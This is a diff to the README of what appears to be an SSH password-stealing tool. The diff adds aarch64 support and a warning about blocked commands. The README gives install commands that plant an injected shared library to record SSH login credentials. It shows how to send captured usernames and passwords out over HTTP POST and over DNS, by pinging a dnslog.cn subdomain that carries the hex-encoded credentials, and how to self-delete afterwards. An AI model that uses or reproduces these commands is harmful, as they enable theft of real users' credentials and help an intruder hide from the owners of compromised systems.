@@ -9,11 +9,11 @@ English | [中文文档](readme_cn.md)
 # how to use
 
 ## auto installer
-anto installer，Only temporarily supports x64
+anto installer，Only temporarily supports x64/aarch64
 
 Run:
 ```
-bash install.sh
+bash install.sh or bash install_aarch64.sh
 ```
 
 Login with ssh password after running，The password record address is /tmp/.password.txt. default evil so path is /tmp/hello.so，default injector path is/tmp/.i
@@ -35,7 +35,7 @@ https send password
 bash install.sh -p "curl -X POST -d 'username=%s\&password=%s' http://127.0.0.1" -m 1
 ```
 
-dns send password and self-delete
+dns send password and self-delete (Please make sure that your command is not blocked, because the actual use of this program is that the system is an online program, if the command is blocked, it will cause the ssh login program to be blocked)
 ```
 bash install.sh -p 'ping `echo %s-%s|xxd -ps`.k9lovy.dnslog.cn -c 1' -m 1 -d anyone
 ```
